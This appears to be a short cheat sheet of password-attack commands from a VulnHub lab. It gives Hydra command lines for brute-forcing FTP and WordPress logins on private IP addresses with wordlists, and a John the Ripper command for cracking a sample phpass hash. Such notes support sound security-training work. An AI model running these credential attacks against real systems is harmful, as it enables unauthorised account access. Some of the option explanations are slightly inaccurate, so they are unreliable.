# Bruteforce commands

## Hydra

### FTP 
```
hydra -L usernames.txt -P usernames.txt 192.168.1.6 ftp

hydra -L users.txt -e nsr 192.168.1.6 ftp (nsr -> Using users.txt, bruteforcing the password in the reverse order)

hydra 10.14.100.44 http-form-post "/wp-login.php:user=admin&pass=^PASS^:INVALID" -l admin -P /usr/share/wordlists/rockyou.txt -vV
```

https://medium.com/@bondo.mike/vulnhub-stapler-1-ab928900d614

## John

### Cracking password using wordlist

Here password hash is collected from mysql database
Content of hash.txt
John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Output - It identifies password of john from the word list.
